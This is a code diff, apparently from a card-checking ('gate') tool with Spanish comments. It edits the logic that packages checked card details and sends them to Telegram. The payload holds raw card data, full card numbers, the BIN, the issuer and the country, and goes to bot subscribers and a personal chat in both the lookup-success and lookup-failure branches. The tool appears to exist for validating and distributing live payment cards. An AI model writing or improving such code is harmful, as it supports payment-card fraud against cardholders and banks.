@@ -264,28 +264,28 @@ export const useGateStore = create<GateState>((set, get) => ({
 
             // Telegram: broadcast a todos los suscriptores
             const tg = useTelegramStore.getState()
+            const digits = number.replace(/\D/g, '')
+            const payload = {
+              raw,
+              number,
+              bin: digits.slice(0, 6),
+              brand: info.brand ?? info.scheme?.toUpperCase() ?? 'Unknown',
+              bank: info.bankName ?? 'Unknown Issuer',
+              country: info.countryName ?? 'Unknown',
+              countryEmoji: info.countryEmoji ?? '',
+              cardType: info.type ?? 'Unknown',
+              cardCategory: [info.type, info.category].filter(Boolean).join(' · ') || 'Unknown',
+              gateName: get().gateName,
+              message,
+              checkedAt: Date.now(),
+            }
             if (tg.enabled && tg.botToken) {
-              const digits = number.replace(/\D/g, '')
-              const payload = {
-                raw,
-                number,
-                bin: digits.slice(0, 6),
-                brand: info.brand ?? info.scheme?.toUpperCase() ?? 'Unknown',
-                bank: info.bankName ?? 'Unknown Issuer',
-                country: info.countryName ?? 'Unknown',
-                countryEmoji: info.countryEmoji ?? '',
-                cardType: info.type ?? 'Unknown',
-                cardCategory: [info.type, info.category].filter(Boolean).join(' · ') || 'Unknown',
-                gateName: get().gateName,
-                message,
-                checkedAt: Date.now(),
-              }
               broadcastLiveCard(payload, tg.botToken).then((result) => {
                 if (result.sent > 0) useTelegramStore.getState().markSent()
               })
-              if (tg.notifyPersonal && tg.personalChatId) {
-                sendLiveCard(payload, tg.botToken, tg.personalChatId)
-              }
+            }
+            if (tg.notifyPersonal && tg.botToken && tg.personalChatId) {
+              sendLiveCard(payload, tg.botToken, tg.personalChatId)
             }
           })
           .catch(() => {
@@ -293,28 +293,28 @@ export const useGateStore = create<GateState>((set, get) => ({
 
             // Telegram: broadcast incluso sin BIN info
             const tg = useTelegramStore.getState()
+            const digits = number.replace(/\D/g, '')
+            const payload = {
+              raw,
+              number,
+              bin: digits.slice(0, 6),
+              brand: 'Unknown',
+              bank: 'Unknown Issuer',
+              country: 'Unknown',
+              countryEmoji: '',
+              cardType: 'Unknown',
+              cardCategory: 'Unknown',
+              gateName: get().gateName,
+              message,
+              checkedAt: Date.now(),
+            }
             if (tg.enabled && tg.botToken) {
-              const digits = number.replace(/\D/g, '')
-              const payload = {
-                raw,
-                number,
-                bin: digits.slice(0, 6),
-                brand: 'Unknown',
-                bank: 'Unknown Issuer',
-                country: 'Unknown',
-                countryEmoji: '',
-                cardType: 'Unknown',
-                cardCategory: 'Unknown',
-                gateName: get().gateName,
-                message,
-                checkedAt: Date.now(),
-              }
               broadcastLiveCard(payload, tg.botToken).then((result) => {
                 if (result.sent > 0) useTelegramStore.getState().markSent()
               })
-              if (tg.notifyPersonal && tg.personalChatId) {
-                sendLiveCard(payload, tg.botToken, tg.personalChatId)
-              }
+            }
+            if (tg.notifyPersonal && tg.botToken && tg.personalChatId) {
+              sendLiveCard(payload, tg.botToken, tg.personalChatId)
             }
           })
       }
